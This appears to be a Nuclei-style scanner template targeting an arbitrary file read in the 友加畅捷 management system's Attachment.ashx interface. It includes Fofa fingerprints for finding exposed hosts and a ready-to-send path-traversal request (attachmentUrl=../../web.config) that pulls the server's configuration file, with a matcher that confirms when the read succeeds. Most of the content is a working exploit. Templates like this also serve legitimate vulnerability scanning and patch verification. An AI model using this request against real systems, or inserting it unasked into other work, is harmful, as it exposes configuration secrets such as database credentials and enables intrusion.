id: YouJiaChangJieGuanLiXiTong-Attachment_ashx-File-Reading

info:
  name: 友加畅捷管理系统 Attachment.ashx 任意文件读取
  author: HuanXiong
  severity: medium
  description: |-
    Fofa: icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
    该系统的 Attachment.ashx 接口存在任意文件读取漏洞。攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息。 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。
  reference: |
    -
  tags: File Reading
  
http:
  - raw:
      - |-
        GET /Controllers/ajax/Attachment.ashx?attachmentUrl=../../web.config HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,be;q=0.8
        Cache-Control: max-age=0
        Connection: keep-alive
        Cookie: toLogin=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code==200 && contains_all(body,'configuration','configSections','appSettings')"